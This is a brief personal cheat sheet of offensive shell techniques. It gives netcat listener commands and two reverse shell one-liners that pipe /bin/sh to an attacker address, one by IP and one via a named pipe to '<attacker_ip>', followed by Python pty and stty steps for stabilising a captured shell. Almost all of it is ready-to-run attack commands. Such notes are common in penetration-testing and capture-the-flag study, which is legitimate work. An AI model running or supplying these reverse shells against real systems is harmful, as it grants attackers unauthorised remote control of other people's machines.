# CyberCheatSheets
Reference Sheets / Notes of techniques learned

Reverse Shells:

+ <b>Netcat - Listener</b>
```
$nc -nvlp 4242
```

+ <b>Netcat - Connecting to Listener</b>
```
nc -e /bin/sh 192.168.0.1 4242
```

+ <b>Netcat - Connecting to Listener without -e</b>
```
$mknod /tmp/backpipe p
$/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
```

Elevate/Stabilize Shells:

+ <b>Using Ptyhon</b>
```
python -c ‘import pty;pty.spawn(“/bin/bash”)’
$export TERM=xterm
$^Z
$stty raw -echo; fg
(ENTER)
```
